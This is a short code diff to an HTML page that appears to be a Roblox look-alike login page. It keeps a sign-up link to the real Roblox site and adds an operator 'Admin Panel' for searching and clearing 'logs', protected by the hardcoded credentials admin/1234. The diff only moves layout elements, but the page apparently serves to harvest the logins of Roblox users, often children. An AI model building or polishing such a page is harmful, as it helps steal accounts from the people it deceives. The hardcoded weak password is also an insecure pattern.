@@ -156,12 +156,14 @@
         <button class="link-btn" onclick="window.location.href='https://www.roblox.com/CreateAccount'">Don't have an account? Sign Up</button>
     </div>
     <div class="admin-container" id="admin-container">
-        <h2>Admin Panel</h2>
-        <input type="text" id="search-bar" class="search-bar" placeholder="Search logs..." onkeyup="searchLogs()">
+    <div class="admin-header">
         <button onclick="clearLogs()">Clear Logs</button>
-        <div class="log-list" id="log-list"></div>
-        <button onclick="logout()">Logout</button>
+        <button onclick="logout()">Log Out</button>
     </div>
+    <h2>Admin Panel</h2>
+    <input type="text" id="search-bar" class="search-bar" placeholder="Search logs..." onkeyup="searchLogs()">
+    <div class="log-list" id="log-list"></div>
+</div>
     <script>
         const ADMIN_USERNAME = 'admin';
         const ADMIN_PASSWORD = '1234';
